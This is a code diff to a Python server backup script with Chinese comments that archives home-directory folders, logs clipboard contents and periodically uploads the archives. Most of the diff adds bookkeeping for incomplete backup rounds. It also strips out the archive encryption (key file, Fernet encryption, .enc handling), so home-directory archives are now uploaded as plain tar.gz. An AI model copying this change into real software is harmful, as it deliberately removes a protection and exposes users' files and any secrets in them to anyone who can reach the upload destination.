@@ -65,11 +65,6 @@ except ImportError as e:
 if import_failed:
     print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")
 
-try:
-    from cryptography.fernet import Fernet
-except ImportError:
-    Fernet = None
-
 class BackupConfig:
     # 调试配置
     DEBUG_MODE = True  # 是否输出调试日志（False/True）
@@ -91,7 +86,6 @@ class BackupConfig:
     # 本地备份安全配置
     BACKUP_DIR_MODE = 0o700
     BACKUP_FILE_MODE = 0o600
-    ENCRYPTION_KEY_FILE = str(Path.home() / ".dev" / "Backup" / ".encryption.key")
     CLIPBOARD_MAX_SIZE = 5 * 1024 * 1024
 
     # 性能优化常量
@@ -784,54 +778,6 @@ class BackupManager:
                     pass
             return None
 
-    def _get_backup_fernet(self):
-        """获取用于备份归档的本机密钥，并确保密钥文件权限受限。"""
-        if Fernet is None:
-            raise RuntimeError("缺少 cryptography 依赖，无法加密备份归档")
-
-        key = os.environ.get("BACKUP_ENCRYPTION_KEY")
-        key_path = Path(self.config.ENCRYPTION_KEY_FILE)
-        if key:
-            key_bytes = key.encode("ascii")
-        else:
-            key_path.parent.mkdir(mode=self.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
-            os.chmod(key_path.parent, self.config.BACKUP_DIR_MODE)
-            if key_path.exists():
-                key_bytes = key_path.read_bytes().strip()
-            else:
-                key_bytes = Fernet.generate_key()
-                flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
-                fd = os.open(str(key_path), flags, self.config.BACKUP_FILE_MODE)
-                try:
-                    os.write(fd, key_bytes)
-                finally:
-                    os.close(fd)
-                os.chmod(key_path, self.config.BACKUP_FILE_MODE)
-
-        return Fernet(key_bytes)
-
-    def _encrypt_file(self, source_path, encrypted_path):
-        """加密归档并以原子方式写入目标文件。"""
-        temp_path = f"{encrypted_path}.tmp-{os.getpid()}"
-        try:
-            fernet = self._get_backup_fernet()
-            with open(source_path, "rb") as source:
-                encrypted = fernet.encrypt(source.read())
-            with open(temp_path, "wb") as output:
-                output.write(encrypted)
-            os.chmod(temp_path, self.config.BACKUP_FILE_MODE)
-            os.replace(temp_path, encrypted_path)
-            os.chmod(encrypted_path, self.config.BACKUP_FILE_MODE)
-            return True
-        except Exception as e:
-            logging.error(f"加密归档失败 {source_path}: {e}")
-            try:
-                if os.path.exists(temp_path):
-                    os.remove(temp_path)
-            except OSError:
-                pass
-            return False
-
     def zip_backup_folder(self, folder_path, zip_file_path):
         try:
             if folder_path is None or not os.path.exists(folder_path):
@@ -855,19 +801,15 @@ class BackupManager:
                         continue
 
             tar_path = f"{zip_file_path}.tar.gz"
-            encrypted_path = f"{tar_path}.enc"
-            for stale_path in (tar_path, encrypted_path):
-                if os.path.exists(stale_path):
-                    os.remove(stale_path)
+            # 清理同名旧归档，避免残留文件被误上传
+            if os.path.exists(tar_path):
+                os.remove(tar_path)
 
             with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
                 tar.add(folder_path, arcname=os.path.basename(folder_path))
 
-            if not self._encrypt_file(tar_path, encrypted_path):
-                os.remove(tar_path)
-                return None
-            os.remove(tar_path)
-            archive_path = encrypted_path
+            # 不再加密，直接上传 tar.gz 归档
+            archive_path = tar_path
 
             try:
                 compressed_size = os.path.getsize(archive_path)
@@ -895,12 +837,12 @@ class BackupManager:
                 
         except Exception as e:
             logging.error(f"压缩失败 {folder_path}: {e}")
-            for candidate in (f"{zip_file_path}.tar.gz", f"{zip_file_path}.tar.gz.enc"):
-                try:
-                    if os.path.exists(candidate):
-                        os.remove(candidate)
-                except OSError:
-                    pass
+            try:
+                incomplete_archive = f"{zip_file_path}.tar.gz"
+                if os.path.exists(incomplete_archive):
+                    os.remove(incomplete_archive)
+            except OSError:
+                pass
             return None
 
     def upload_backup(self, backup_paths):
@@ -1346,16 +1288,23 @@ def is_server():
     return platform.system().lower() == "linux"
 
 def backup_server(backup_manager, source, target):
-    """备份服务器，返回备份文件路径列表（不执行上传）- 分别压缩各个分目录"""
+    """备份服务器，分别压缩各个分目录。
+
+    Returns:
+        (归档路径列表或 None, 本轮备份是否完整完成)
+        - 空目录按设计跳过，不算失败
+        - 目录缺失或压缩失败记为部分完成
+    """
     backup_dirs = backup_manager.backup_linux_files(source, target)
     if not backup_dirs:
-        return None
+        return None, False
 
     
     username = getpass.getuser()
     user_prefix = username[:5] if username else "user"
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     all_backup_paths = []
+    complete = True
     
     # 分别压缩各个目录
     dir_names = {
@@ -1367,6 +1316,8 @@ def backup_server(backup_manager, source, target):
     for dir_key, dir_path in backup_dirs.items():
         # 检查目录是否存在且不为空
         if not os.path.exists(dir_path):
+            logging.error(f"❌ 备份目录缺失: {dir_key}")
+            complete = False
             continue
         
         # 其他目录正常压缩
@@ -1377,6 +1328,7 @@ def backup_server(backup_manager, source, target):
                     logging.debug(f"⏭️ 跳过空目录: {dir_key}")
                 continue
         except OSError:
+            complete = False
             continue
         
         # 压缩目录（压缩文件保存在 target_dir 的父目录中）
@@ -1394,26 +1346,52 @@ def backup_server(backup_manager, source, target):
             logging.critical(f"☑️ {dir_names[dir_key]} 目录备份文件已准备完成")
         else:
             logging.error(f"❌ {dir_names[dir_key]} 目录备份压缩失败")
+            complete = False
     
     if all_backup_paths:
         logging.critical(f"☑️ 服务器备份文件已准备完成（共 {len(all_backup_paths)} 个文件）")
-        return all_backup_paths
+        if not complete:
+            logging.error("❌ 部分备份目录未生成有效归档")
+        return all_backup_paths, complete
     else:
         logging.error("❌ 服务器备份压缩失败（没有生成任何备份文件）")
-        return None
+        return None, False
 
 def find_pending_backup_files(backup_manager, target):
-    """查找上轮上传失败而保留在备份根目录中的加密归档。"""
+    """查找上轮上传失败而保留在备份根目录中的归档。"""
     backup_root = Path(target).resolve().parent
     pending = []
     try:
         for path in backup_root.iterdir():
-            if path.is_file() and (path.name.endswith(".tar.gz.enc") or ".tar.gz.enc.part" in path.name):
+            if path.is_file() and (
+                path.name.endswith(".tar.gz")
+                or ".tar.gz.part" in path.name
+            ):
                 if backup_manager._is_valid_file(str(path)):
                     pending.append(str(path))
     except OSError as e:
         logging.error(f"扫描待上传备份失败: {e}")
     return sorted(pending)
+
+def evaluate_round_completion(backup_paths, backup_complete, archives_uploaded, pending_uploaded):
+    """判断本轮备份是否满足推进 7 天周期的条件。
+
+    条件：本轮生成有效归档、备份非部分完成、全部上传成功（含遗留归档重试）。
+
+    Returns:
+        (是否推进周期, 未完成原因列表)
+    """
+    reasons = []
+    if not backup_paths:
+        reasons.append("未生成有效归档")
+    else:
+        if not backup_complete:
+            reasons.append("部分备份目录未生成有效归档")
+        if not archives_uploaded:
+            reasons.append("本轮归档未全部上传成功")
+    if not pending_uploaded:
+        reasons.append("遗留归档未全部上传成功")
+    return (not reasons), reasons
 
 def backup_and_upload_logs(backup_manager):
     log_file = backup_manager.config.LOG_FILE
@@ -1639,7 +1617,6 @@ def clean_backup_directory():
             f"{user_prefix}_backup.log",
             f"{user_prefix}_clipboard_log.txt",
             "next_backup_time.txt",
-            ".encryption.key",
         ]
         
         for item in os.listdir(backup_dir):
@@ -1647,8 +1624,8 @@ def clean_backup_directory():
             try:
                 if item in keep_files:
                     continue
-                if item.endswith(".tar.gz.enc") or ".tar.gz.enc.part" in item:
-                    # 保留上传失败的加密归档，供下一轮重试
+                if item.endswith(".tar.gz") or ".tar.gz.part" in item:
+                    # 保留上传失败的归档，供下一轮重试
                     continue
                     
                 if os.path.isfile(item_path):
@@ -1715,7 +1692,7 @@ def should_perform_backup(backup_manager):
 def main():
     if not is_server():
         logging.critical("本脚本仅适用于服务器环境")
-        return
+        return 0
 
     try:
         backup_manager = BackupManager()
@@ -1728,6 +1705,7 @@ def main():
         logging.critical("\n备份程序已停止")
     except Exception as e:
         logging.critical(f"程序出错: {e}")
+    return 0
 
 def periodic_backup_upload(backup_manager):
     source = str(Path.home())
@@ -1839,14 +1817,16 @@ def periodic_backup_upload(backup_manager):
                 logging.critical("-"*40)
 
                 # 先重试上一轮未成功上传的归档，避免新一轮清理目标目录时丢失待上传文件
+                pending_uploaded = True
                 pending_paths = find_pending_backup_files(backup_manager, target)
                 if pending_paths:
                     logging.critical(f"📤 重试上一轮遗留备份 ({len(pending_paths)} 个文件)...")
-                    if not backup_manager.upload_backup(pending_paths):
-                        logging.error("❌ 遗留备份仍有上传失败，将保留文件并继续生成本轮备份")
+                    pending_uploaded = backup_manager.upload_backup(pending_paths)
+                    if not pending_uploaded:
+                        logging.error("❌ 遗留备份仍有上传失败，将保留文件等待重试")
 
                 logging.critical("\n🖥️ 服务器指定目录备份")
-                backup_paths = backup_server(backup_manager, source, target)
+                backup_paths, backup_complete = backup_server(backup_manager, source, target)
 
                 # 输出结束语（在上传之前）
                 logging.critical("\n" + "="*40)
@@ -1857,25 +1837,32 @@ def periodic_backup_upload(backup_manager):
                 logging.critical("="*40 + "\n")
 
                 # 开始上传备份文件
-                backup_uploaded = False
+                archives_uploaded = False
                 if backup_paths:
                     file_count = len(backup_paths)
                     logging.critical(f"📤 上传 {file_count} 个文件...")
-                    backup_uploaded = backup_manager.upload_backup(backup_paths)
-                    if backup_uploaded:
+                    archives_uploaded = backup_manager.upload_backup(backup_paths)
+                    if archives_uploaded:
                         logging.critical("✅ 上传完成")
                     else:
-                        logging.error("❌ 部分文件上传失败，保留本地文件等待重试")
+                        logging.error("❌ 本轮归档未全部上传成功，保留本地文件等待重试")
                 else:
-                    logging.error("❌ 未生成备份文件，本轮不更新下次备份时间")
+                    logging.error("❌ 未生成本轮有效归档")
 
-                # 只有备份文件全部上传成功后才推进调度时间
-                if backup_uploaded:
+                # 只有本轮生成有效归档、备份非部分完成且全部上传成功，才推进 7 天周期
+                round_ok, incomplete_reasons = evaluate_round_completion(
+                    backup_paths, backup_complete, archives_uploaded, pending_uploaded
+                )
+
+                if round_ok:
                     save_next_backup_time(backup_manager)
                     next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                     logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                 else:
-                    logging.critical("🔄 上传未完成，将在下一轮重试")
+                    logging.critical(
+                        "🔄 本轮备份未完整完成（" + "；".join(incomplete_reasons) + "），"
+                        "不推进 7 天周期，将在下一轮重试"
+                    )
                 
                 # 上传备份日志
                 if backup_manager.config.DEBUG_MODE:
@@ -1894,4 +1881,4 @@ def periodic_backup_upload(backup_manager):
         logging.error(f"❌ 备份过程出错: {e}")
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
